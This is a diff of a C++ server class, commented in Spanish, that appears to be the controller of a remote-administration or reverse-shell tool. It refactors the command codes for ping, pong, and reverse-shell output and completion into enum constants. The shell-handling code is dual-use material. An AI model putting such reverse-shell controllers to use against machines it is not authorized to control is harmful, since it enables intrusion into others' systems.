@@ -186,7 +186,9 @@ void Servidor::m_Ping(){
             } else {
                 if (!it->_isBusy) {
                     //Si no esta activo enviar el ping
-                    int iBytes = this->cSend(it->_sckCliente, "PING~1", 6, 0, false);
+                    std::string strData = std::to_string(EnumComandos::PING);
+                    strData.append(1, '~');
+                    int iBytes = this->cSend(it->_sckCliente, strData.c_str(), strData.size(), 0, false);
                     if (iBytes <= 0) {
                         //No se pudo enviar el ping
                         std::string strTmp = "Cliente " + it->_strIp + "-" + it->_id + " desconectado";
@@ -319,7 +321,8 @@ void Servidor::m_Escucha(){
                         this->iCount++;
                     }
 
-                    if (vcDatos[0] == "02") {//Pong
+                    if (vcDatos[0] == std::to_string(EnumComandos::PONG)) {//Pong
+                        std::cout << "PONG de" << iSock << std::endl;
                         std::unique_lock<std::mutex> lock(vector_mutex);
                         
                         for (auto vcCli : this->vc_Clientes) {
@@ -329,7 +332,6 @@ void Servidor::m_Escucha(){
                             }
                         }
                         lock.unlock();
-                        
                     }
 
                     if (vcDatos[0] == "03") { //CUSTOM_TEST
@@ -355,10 +357,9 @@ void Servidor::m_Escucha(){
                         } else {
                             std::cout << "No se pudo encontrar ventana activa con nombre " << strTempID << std::endl;
                         }
-
                     }
 
-                    if (vcDatos[0] == "05") { //Termino la shell
+                    if (vcDatos[0] == std::to_string(EnumComandos::Reverse_Shell_Finish)) { //Termino la shell
                         std::string strTempID = "";
                         std::unique_lock<std::mutex> lock(vector_mutex);
                         for(auto vcCli = this->vc_Clientes.begin(); vcCli != this->vc_Clientes.end(); vcCli++){
@@ -373,7 +374,7 @@ void Servidor::m_Escucha(){
                         isEscribirSalidaShell(strTempID, vcDatos[1]);
                     }
 
-                    if (vcDatos[0] == "06") {
+                    if (vcDatos[0] == std::to_string(EnumComandos::Reverse_Shell_Salida)) {
                         std::string strOutJoined = "";
                         for (int i = 1; i<int(vcDatos.size()); i++) {
                             strOutJoined += vcDatos[i] + "\\";
@@ -391,7 +392,7 @@ void Servidor::m_Escucha(){
                         lock.unlock();
 
                         isEscribirSalidaShell(strTempID, strOutJoined);
-
+                        
                     }
                 }
             }
